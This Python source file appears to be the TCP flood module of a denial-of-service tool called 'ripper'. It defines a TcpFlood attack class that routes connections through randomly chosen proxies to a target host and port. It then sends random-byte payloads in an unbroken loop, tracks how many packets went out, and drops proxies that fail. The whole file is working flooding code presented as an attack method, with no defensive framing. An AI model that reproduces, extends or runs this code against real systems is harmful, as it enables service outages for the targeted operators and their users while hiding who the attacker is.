from socket import socket
from contextlib import suppress
from typing import Any
from socks import ProxyError

from ripper.context.events_journal import EventsJournal
from ripper.context.target import Target
from ripper.common import generate_random_bytes
from ripper.actions.attack_method import AttackMethod
from ripper.proxy import Proxy

# Forward Reference
Context = 'Context'

events_journal = EventsJournal()


class TcpFlood(AttackMethod):
    """TCP Flood method."""

    name: str = 'TCP Flood'
    label: str = 'tcp-flood'

    _sock: socket
    _target: Target
    _ctx: Context
    _proxy: Proxy = None

    def __init__(self, target: Target, context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self) -> socket:
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_tcp_socket(self._proxy)
        conn.connect(self._target.hostip_port_tuple())

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as tcp_conn:
            self._target.stats.connect.status_success()
            events_journal.info('Creating new TCP connection...', target=self._target)
            while self.send(tcp_conn):
                if self._ctx.dry_run:
                    break
                continue

            self._target.stats.connect.status_failed()
            # self._ctx.sock_manager.close_socket()

    def send(self, sock: socket) -> bool:
        send_bytes = generate_random_bytes(self._target.min_random_packet_len, self._target.max_random_packet_len)
        try:
            sent = sock.send(send_bytes)
        except ProxyError as ep:
            events_journal.exception(ep, target=self._target)
            self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
        except Exception as e:
            events_journal.exception(e, target=self._target)
        else:
            self._target.stats.packets.status_sent(sent_bytes=sent)
            self._proxy.report_success() if self._proxy is not None else 0
            return True

        return False
